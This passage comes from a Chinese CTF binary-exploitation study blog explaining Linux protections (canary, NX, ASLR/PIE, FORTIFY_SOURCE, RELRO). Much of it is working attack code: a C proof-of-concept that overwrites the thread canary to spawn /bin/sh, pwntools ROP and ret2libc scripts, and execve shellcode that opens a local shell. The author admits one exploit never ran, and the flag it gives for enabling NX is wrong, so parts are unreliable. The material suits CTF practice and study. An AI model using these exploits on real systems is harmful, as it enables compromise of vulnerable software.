<li>relro。使程序的某些部分（主要是动态链接信息）变为只读，这可以防止这些部分被修改，增强安全性。</li>
</ul>
</li>
</ol>
<p><img src="/images/ctf-guide-pwn-1/1713081396919-bc091f75-9ee8-4d5b-9f0e-ebff63272a42.png" alt="img"></p>
<p><img src="/images/ctf-guide-pwn-1/1713081252426-63edcbf3-9e76-44a6-8cf6-1dd8a936d368.png" alt="img"></p>
<p>&emsp;其实，通过 pthread_create 创建的线程，glibc 在 TLS 的实现上是有问题的。具体而言：</p>
<ul>
<li><p>由于栈是由高地址向低地址增长，glibc 在高地址对 TLS 进行初始化，从 TLS 减去一个固定值，可以得到新线程用于栈寄存器的值（新线程用于保存栈寄存器的地址）。</p>
</li>
<li><p>从 TLS 到传递给 pthread_create 的运行函数的栈帧，距离小于一页。因此，攻击者无须纠结原 canary 的值是什么，可以直接溢出足够多的数据篡改 tcbhead_t.stack_guard，也就是同时篡改 TLS 和栈上的 Canaries。</p>
</li>
</ul>
<p>&emsp;给一个相关的代码示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line"></span><br><span class="line">void pwn_payload() &#123;</span><br><span class="line">    char *argv[2] = &#123;&quot;/bin/sh&quot;, 0&#125;;</span><br><span class="line">    execve(argv[0], argv, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fixup = 0;</span><br><span class="line">void *first(void *x) &#123;</span><br><span class="line">    unsigned long *addr;</span><br><span class="line"></span><br><span class="line">    // 获取 FS 的地址（线程的 TLS）</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    printf(&quot;thread FS %p\n&quot;, addr);</span><br><span class="line">    printf(&quot;cookie thread: 0x%lx\n&quot;, addr[5]);</span><br><span class="line"></span><br><span class="line">    // 获取当前函数（first）的栈基址</span><br><span class="line">    // 内存：ret addr - canaries，从高到低</span><br><span class="line">    unsigned long *frame = __builtin_frame_address(0);</span><br><span class="line">    printf(&quot;stack_cookie addr %p\n&quot;, &amp;frame[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;diff: %lx\n&quot;, (char*)addr - (char*)&amp;frame[-1]);</span><br><span class="line">    unsigned long len = (unsigned long)((char*)addr - (char*)&amp;frame[-1]) + fixup;</span><br><span class="line">    void *expolit = malloc(len);</span><br><span class="line">    memset(expolit, 0x41, len);</span><br><span class="line"></span><br><span class="line">    void *ptr = &amp;pwn_payload;</span><br><span class="line">    memcpy((char*)expolit+16, &amp;ptr, 8);</span><br><span class="line">    memcpy(&amp;frame[-1], expolit, len);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)&#123;</span><br><span class="line">    pthread_t one;</span><br><span class="line">    unsigned long *addr;</span><br><span class="line">    void *val;</span><br><span class="line"></span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    if (argc &gt; 1) &#123;</span><br><span class="line">        fixup = 0x30;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;main FS %p\n&quot;, addr);</span><br><span class="line">    printf(&quot;cookie main: 0x%lx\n&quot;, addr[5]);</span><br><span class="line">    pthread_create(&amp;one, NULL, &amp;first, 0);</span><br><span class="line">    pthread_join(one, &amp;val);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/ctf-guide-pwn-1/1713086064840-8d513db2-3a3f-4e41-9fa6-1c6d60bea93b.png" alt="img"></p>
<p><strong>解题思路：</strong></p>
<ul>
<li>通过栈溢出构造 rop。</li>
<li>使用 put 函数 leak 出 libc 的基地址。</li>
<li>找到 one_gadget 的偏移，并计算出 one_gadget 的实际地址。</li>
<li>将这个地址读到 bss 段，使用 leave+ret，劫持 rip 到one_gadaget。</li>
</ul>
<p><strong>Step1：使用 put 函数 leak 出 libc 的基地址</strong></p>
<p>&emsp;当调用 puts.plt（代码段） 的时候，系统会将真正的 puts 函数地址 link 到 puts.got（数据段） 中，然后 puts.plt 会根据 puts.got 跳转到 puts 函数。我们最终想达到的目的是 put(puts.got)。因此需要 gadget 去调用 put 函数，并传递 put.got 参数。</p>
<p><img src="/images/ctf-guide-pwn-1/1713254895614-0e8dc5e5-a26c-4987-9a4b-1831fadcf7c3.png" alt="img"></p>
<p>&emsp;其中，pop_rdi_addr 可以使用 ROPgadget 在 bs 文件中找。</p>
<p><img src="/images/ctf-guide-pwn-1/1713255005808-ee5c1f97-a315-4dae-8897-2311eed30bbb.png" alt="img"></p>
<p>&emsp;因此，pop_rdi_addr = 0x400c03。</p>
<p><strong>Step2：找到 one_gadget 的偏移，并计算出 one_gadget 的实际地址，并使用 leave+ret 劫持到 one_gadget</strong></p>
<p>&emsp;one_gadget 可以理解为开 bash 的代码段，如下所示：</p>
<p><img src="/images/ctf-guide-pwn-1/1713255095699-4f14fbe4-0df3-48d8-90a8-05c448ed6fcf.png" alt="img"></p>
<p>&emsp;可以使用 one_gadget 在 libc.so 中找（在这里取 0xf1147）：</p>
<p><img src="/images/ctf-guide-pwn-1/1713255151958-91ba2c54-7e5a-4cdf-85c3-4124eac351f0.png" alt="img"></p>
<p>&emsp;接下来的构造理解起来比较难，具体而言：</p>
<ul>
<li>拿到上一步的 libc 基地址。</li>
<li>计算 one_gadget 的实际地址，使用 read(0, bss_addr) 将实际地址写入到 bss_addr 中。</li>
<li>使用 leave+ret 指令（相当于 mov rsp, rbp; pop rbp; pop rip;）将 rip 设置到 bss_addr 指向的地址。（虽然 bss 段是 NX 保护不可执行的，但是 libc 中的 one_gadget 是可执行的）</li>
</ul>
<p><img src="/images/ctf-guide-pwn-1/1713256233734-61e3671d-ce07-4226-ad05-c6c5b1f0d8f2.png" alt="img"></p>
<p>&emsp;其中，pop_rsi_r15_addr 可以使用 ROPgadget 找到，其值为 0x400c01。leave_ret_addr 也可以找到，为 0x400955。</p>
<p><img src="/images/ctf-guide-pwn-1/1713256363727-4f93a7b4-d22f-472b-828a-e6076dd21214.png" alt="img"></p>
<p>&emsp;bss_addr 可以使用 readelf -S bs 找到，为 0x602010。</p>
<p><img src="/images/ctf-guide-pwn-1/1713256586918-1fbc049c-07f1-400b-8003-92d2a038c1e5.png" alt="img"></p>
<p><strong>EXP：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./bs&quot;, env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;libc.so&#x27;&#125;)</span><br><span class="line">elf = ELF(&#x27;bs&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi=0x400c03</span><br><span class="line">pop_rsi_r15=0x400c01</span><br><span class="line">leave_ret=0x400955</span><br><span class="line"></span><br><span class="line">bss_addr=0x602030</span><br><span class="line"></span><br><span class="line"># TLS 与栈中的 canary 小于 1 页</span><br><span class="line">payload=b&#x27;\x00&#x27;*0x1008</span><br><span class="line">payload+=b&#x27;\x11&#x27;*0x8                            # canary</span><br><span class="line">payload+=p64(bss_addr-0x8)                      # rbp</span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.got[&#x27;puts&#x27;])      # rdi=puts.got</span><br><span class="line">payload+=p64(elf.plt[&#x27;puts&#x27;])                   # puts(puts.got)</span><br><span class="line">payload+=p64(pop_rdi)+p64(0)                    # rdi=0</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(0)  # rsi=bss_addr</span><br><span class="line">payload+=p64(elf.plt[&#x27;read&#x27;])</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(0x17e8,b&#x27;\x00&#x27;)           # 0x17e8 不知道咋得到的</span><br><span class="line">payload+=b&#x27;\x11&#x27;*0x8</span><br><span class="line">payload=payload.ljust(0x2000,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;send?\n&quot;,str(0x2000).encode())</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;goodbye.\n&quot;)</span><br><span class="line"></span><br><span class="line">libc_base=u64(io.recv(6).ljust(8,b&quot;\x00&quot;))-libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">one_gadget=libc_base+0xf1147</span><br><span class="line">log.info(&quot;libc address: 0x%x&quot;%libc_base)</span><br><span class="line"></span><br><span class="line">log.info(&quot;one gadget: 0x%x&quot;%one_gadget)</span><br><span class="line">io.send(p64(one_gadget))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;这个 exp 一直运行不起来，报内部错误，也没有深究。</p>
<h3 id="NX-No-eXecute（堆栈不可执行）"><a href="#NX-No-eXecute（堆栈不可执行）" class="headerlink" title="NX:No-eXecute（堆栈不可执行）"></a>NX:No-eXecute（堆栈不可执行）</h3><p>&emsp;将数据所在的内存页标识为不可执行。实施 NX 有多种技术，Windows 上是 DEP，Linux 上是 NX、W^X、PaX、Exec Shield 等。</p>
<p>&emsp;NX 需要结合软件和硬件共同完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">硬件层面：利用处理器的 NX 位，对页表项中的第 63 位进行设置，设置为 1 表示不可执行。一旦程序计数器（PC）在受保护的页面内，就会触发硬件层面的异常。</span><br><span class="line"></span><br><span class="line">软件层面：NX 有时会给动态生成的代码（JIT）来问题。因此在软件层面提供了 API。Windows 的 VirtualProtect/VirtualAlloc，Linux 的 mprotect/mmap。</span><br></pre></td></tr></table></figure>
<p>&emsp;NX 开启后，程序的 .text 为可执行，而 .data、.bss 以及栈、堆均为不可执行。因此，通过修改 GOT 来执行 shellcode 的方式不再可行，但不能阻止攻击者通过代码重用来进行攻击（ret2libc）（我理解就是找 libc 中的 one_gadget）。开启 NX 的指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z exestack hello.c</span><br></pre></td></tr></table></figure>
<p>&emsp;跟着 <a target="_blank" rel="noopener" href="https://blog.csdn.net/lizhixiong2/article/details/105037778">link</a> 安装 gdb 相关工具，然后跟着示例做实验。</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240507153907569.png" alt="image-20240507153907569" style="zoom:67%;" /></p>
<p>&emsp;实验思想是：使用 gdb 观察返回地址与缓冲区溢出开头的距离，并将返回地址改为缓冲区开头。但是由于 gdb 与真实环境有差距，因此使用 core dump 确定距离。具体看 P74。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd520</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0:  31 c9                   xor    ecx,ecx</span></span><br><span class="line"><span class="string">2:  f7 e1                   mul    ecx</span></span><br><span class="line"><span class="string">4:  b0 0b                   mov    al,0xb       ; eax = 0xb, execve</span></span><br><span class="line"><span class="string">6:  51                      push   ecx          ; ecx = 0</span></span><br><span class="line"><span class="string">7:  68 2f 2f 73 68          push   0x68732f2f   </span></span><br><span class="line"><span class="string">c:  68 2f 62 69 6e          push   0x6e69622f</span></span><br><span class="line"><span class="string">11: 89 e3                   mov    ebx,esp      ; ebx = &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="string">13: cd 80                   int    0x80         ; execve(&#x27;/bin/sh&#x27;, NULL, NULL)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">b&quot;A&quot;</span>*(<span class="number">140</span>-<span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;如果开 NX（堆栈不可执行） 的话，就需要在目前的代码中找 /bin/sh，代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = <span class="built_in">process</span>(<span class="string">&#x27;./b.out&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0</span></span><br><span class="line">system_addr = <span class="number">0xf7e09360</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f54363</span></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">140</span>+<span class="built_in">p32</span>(system_addr) + <span class="built_in">p32</span>(ret) + <span class="built_in">p32</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.<span class="built_in">send</span>(payload)</span><br><span class="line">io.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>
<h3 id="ASLR-与-PIE（地址空间随机化）"><a href="#ASLR-与-PIE（地址空间随机化）" class="headerlink" title="ASLR 与 PIE（地址空间随机化）"></a>ASLR 与 PIE（地址空间随机化）</h3><p>&emsp;攻击者攻击需要知道程序的内存布局，通过 ASLR 引入内存布局的随机化，增加攻击的难度。Linux 中的 ASLR 与配置 <code>/proc/sys/kernel/randomize_va_space</code> 有关，其有 3 种情况：0 表示关闭 ASLR，1 表示部分开启，2 表示完全开启，如下所示：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240507205051761.png" alt="image-20240507205051761" style="zoom:67%;" /></p>
<p>&emsp;ASLR 是操作系统层面的技术，不涉及程序，因此就有了 ret2plt、GOT 劫持，因此就有了 PIE（位置无关可执行文件），通过将程序编译为 PIC（位置无关代码），使程序可以被加载到任意位置，就像是一个特殊的共享库。完全开启 ASLR + PIE 的指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -pie -fpie xx.c</span><br></pre></td></tr></table></figure>
<p>&emsp;对 PIE 的检测：是否是共享目标文件（DYN）+ dynamic 节里是否有 DEBUG 条目。</p>
<p>&emsp;再来看开启 ASLR 时如下程序的利用：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vuln_func</span>();</span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;关闭 PIE 的情况下，程序本身的地址是固定的，因此此时可以使用 write 函数打印出 libc 的地址，接着计算 system 的地址。</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240507221054236.png" alt="image-20240507221054236" style="zoom:67%;" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./nopie.out&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./nopie.out&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib32/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">vuln_func = <span class="number">0x080491b6</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span>*<span class="number">140</span> + p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(vuln_func) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;B&quot;</span>*<span class="number">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;如果开启了 ASLR+PIE，假设我们仍可获得 main 地址，那么计算偏移之后就可以获得 vuln_func 的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-pie -fno-pie 与 -pie -fpie 的区别？</span><br><span class="line"></span><br><span class="line">假设使用 -pie -fno-pie（生成位置无关的文件，但不生成位置无关的代码），生成的是共享目标文件，其符号在链接时进行重定位（此时不使用 GOT/PLT，而是在运行前先将符号占坑，运行的时候再填充，即改原始字节码，直接跳到 libc 对应函数）。</span><br><span class="line"></span><br><span class="line">若使用 -pie -fpie，发现它不直接改原始字节码，而是使用 __x86.get_pc_thunk 函数（将下一条指令的地址给 ebx，然后加偏移得到 GOT 的地址，以此作为后续操作的基地址），详细见下面的描述。</span><br></pre></td></tr></table></figure>
<p>&emsp;使用 -pie -fpie 编译后，找 write 函数的地址，发现：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240507225501291.png" alt="image-20240507225501291" style="zoom:67%;" /></p>
<p>&emsp;此时，在执行到 0x1239 的时候，ebx=0x1239，之后，ebx=0x123e+0x2d96，这是 GOT 表的基址。之后看 write@plt 的代码，发现：</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240507225543140.png" alt="image-20240507225543140" style="zoom:67%;" /></p>
<p>&emsp;因此，write 的 GOT 表偏移为 0x14，查看发现地址是 0x1050（write 函数的地址）。</p>
<p><img src="/images/ctf-guide-pwn-1/image-20240507231609906.png" alt="image-20240507231609906"></p>
<p>&emsp;针对开启 -pie -fpie 的情况写利用脚本（与不开启 pie 的区别是：<code>需要泄露程序本身的加载地址</code>）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pie2.out&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pie2.out&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib32/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assume leak main addr</span></span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line">offset = main_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_func = offset + elf.sym[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line">plt_write = offset + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = offset + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ebx = offset + <span class="number">0x123e</span> + <span class="number">0x2d96</span> <span class="comment"># GOT addr</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span>*<span class="number">132</span> + p32(ebx) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(vuln_func) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;B&quot;</span>*<span class="number">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/images/ctf-guide-pwn-1/image-20240507233226599.png" alt="image-20240507233226599" style="zoom:67%;" /></p>
<h3 id="FORTIFY-SOURCE（缓冲区溢出攻击和格式化字符串攻击检查）"><a href="#FORTIFY-SOURCE（缓冲区溢出攻击和格式化字符串攻击检查）" class="headerlink" title="FORTIFY_SOURCE（缓冲区溢出攻击和格式化字符串攻击检查）"></a>FORTIFY_SOURCE（缓冲区溢出攻击和格式化字符串攻击检查）</h3><p>&emsp;FORTIFY_SOURCE 为字符串操作函数提供轻量级的缓冲区溢出攻击和格式化字符串攻击（%n、%N$）检查，它会将危险函数替换为安全函数。目前所支持的函数有 memcpy、memmove、memset、strcpy 等。该机制在 ubuntu16.04(GCC-5.4.0) 上默认是关闭的。当函数后缀为 _chk 时，表明开启了 FORTIFY_SOURCE，例如 <code>__strcpy_chk()</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">完全开启：gcc -O1 -D_FORTIFY_SOURCE=2</span><br><span class="line">部分开启（仅开启缓冲区溢出检查）：gcc -O1 -D_FORTIFY_SOURCE=1</span><br></pre></td></tr></table></figure>
<p>&emsp;例如 printf_chk，其中设置 _IO_FLAG2_FORTIFY 标志位，并调用了 vfprintf，主要是对 <code>%n</code> 与 <code>%N$</code> 做了安全检查。但是也可以对其进行攻击（整数溢出）：将位于栈上的 _IO_FILE 中的 _IO_FLAGS2_FORTIFY 篡改为 0，从而关闭 FORTIFY_SOURCE 对 <code>%n</code> 的检查，然后再次利用任意地址写，将 nargs 改为 0，从而关闭对 <code>%N$</code> 的检查。</p>
<p>&emsp;同时，vprintf 还有 4byte NULL 写的漏洞：提前计算好栈与 _IO_FLAGS2_FORTIFY 的偏移，利用该偏移构造一个恶意的格式字符串，使 args_type[ATTACKER_OFFSET]=0x00000000，从而达到任意地址写。例如传入的格式字符串为 <code>%1$*269096872$x</code>，此时就会使偏移为 269096872 写入 0。</p>
<h3 id="RELRO（解决延迟绑定的-GOT-表劫持问题）"><a href="#RELRO（解决延迟绑定的-GOT-表劫持问题）" class="headerlink" title="RELRO（解决延迟绑定的 GOT 表劫持问题）"></a>RELRO（解决延迟绑定的 GOT 表劫持问题）</h3><p>&emsp;延迟绑定就是当第一次调用此函数时，才解析 GOT 中函数的实际地址。因此此时 GOT 表（.got.plt）应该是可写的，此时攻击者可以改为恶意地址。RELRO（ReLocation Read-Only）是为了解决延迟绑定的安全问题，它将<code>符号重定向表设置为只读，或者在程序启动时就解析并绑定所有动态符号</code>。RELRO 有两种形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Partial RELRO。一些段(.dynamic、.got) 在初始化后将会被标记为只读。</span><br><span class="line"></span><br><span class="line">Full RELRO。Partial RELRO + 禁止延迟绑定，导入符号将在开始时被解析，.got.plt 段被完全初始化为目标函数的最终地址，并被 mprotect 标记为只读。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关闭 RELRO：-z norelro</span><br><span class="line">部分 RELRO: -z lazy</span><br><span class="line">全部 RELRO：-z now</span><br></pre></td></tr></table></figure>
<p>&emsp;通过检查是否有 GNU_RELRO 段判断是否开启 RELRO，通过动态段表的 BIND_NOW 判断是部分 RELRO 还是全部 RELRO。</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>&emsp;虚拟化分为如下几类：</p>
<ul>
<li>操作系统层虚拟化，不能模拟硬件设备，但可以创建多个虚拟的操作系统实例，如 Docker。</li>
<li>硬件辅助虚拟化，由硬件平台对特殊指令进行截获和重定向，交由虚拟机管理程序进行处理，这需要 CPU、主板、BIOS 和软件的支持，例如 Intel VT-x。</li>
